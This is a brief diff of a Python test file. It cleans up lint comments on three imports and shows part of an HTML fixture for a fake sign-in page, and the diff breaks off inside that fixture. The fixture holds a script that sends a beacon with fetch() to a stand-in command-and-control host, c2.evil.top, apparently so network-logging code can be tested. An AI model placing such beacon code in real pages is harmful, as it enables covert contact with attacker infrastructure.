@@ -17,9 +17,9 @@ import pytest
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-import netlog  # noqa: E402
-import nik_browser  # noqa: E402
-import server  # noqa: E402
+import netlog
+import nik_browser
+import server
 
 PAGE = b"""<!doctype html><html><head><title>Sign in</title></head><body>
 <img src="https://cdn.evil.top/logo.png"><script>fetch('https://c2.evil.top/beacon').catch(() => {});
